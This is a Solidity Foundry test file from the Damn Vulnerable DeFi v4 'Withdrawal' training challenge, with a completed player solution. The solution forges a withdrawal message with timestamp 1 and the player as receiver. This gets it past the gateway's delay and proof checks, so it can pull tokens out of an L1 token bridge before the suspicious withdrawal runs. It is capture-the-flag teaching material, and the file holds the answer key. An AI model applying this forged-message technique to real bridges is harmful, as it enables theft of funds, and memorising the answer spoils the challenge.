// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        uint256 nonce = 0;
        address l2Sender = 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16;
        address target = 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5;
        uint256 timestamp = 1718786915;
        bytes memory message = hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
        bytes32[] memory proof = new bytes32[](2);
        proof[0] = 0x965b8788fd92c869b27dd2e58c7fff118389e5cf8f3b5981dea21a1595c6e2a6;
        proof[1] = 0x6771f445d68c8a8bfeb5466d588cad09af5a056649945960825a1e22eaa630d4;

        // leaf: 0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba
        vm.warp(timestamp + 7 days + 1);
        l1Gateway.finalizeWithdrawal(nonce, l2Sender, target, timestamp, message, proof);

        nonce = 1;
        timestamp = 1718786965;
        message = hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
        proof = new bytes32[](1);

        vm.warp(timestamp + 7 days + 1);
        l1Gateway.finalizeWithdrawal(nonce, l2Sender, target, timestamp, message, proof);


        nonce = 2;
        timestamp = 1;
        // change ea475d60c118d7058bef4bdd9c32ba51139a74e0 (suspicious token receiver) to 44e97af4418b7a17aabd8090bea0a471a366305c (player)
        message = hex"01210a38000000000000000000000000000000000000000000000000000000000000000200000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e5100000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c00000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000";
        l1Gateway.finalizeWithdrawal(nonce, l2Sender, target, timestamp, message, proof);

        nonce = 2;
        timestamp = 1718787050;
        message = hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000";

        vm.warp(timestamp + 7 days + 1);
        l1Gateway.finalizeWithdrawal(nonce, l2Sender, target, timestamp, message, proof);

        nonce = 3;
        timestamp = 1718787127;
        message = hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";

        vm.warp(timestamp + 7 days + 1);
        l1Gateway.finalizeWithdrawal(nonce, l2Sender, target, timestamp, message, proof);

        token.transfer(address(l1TokenBridge), token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
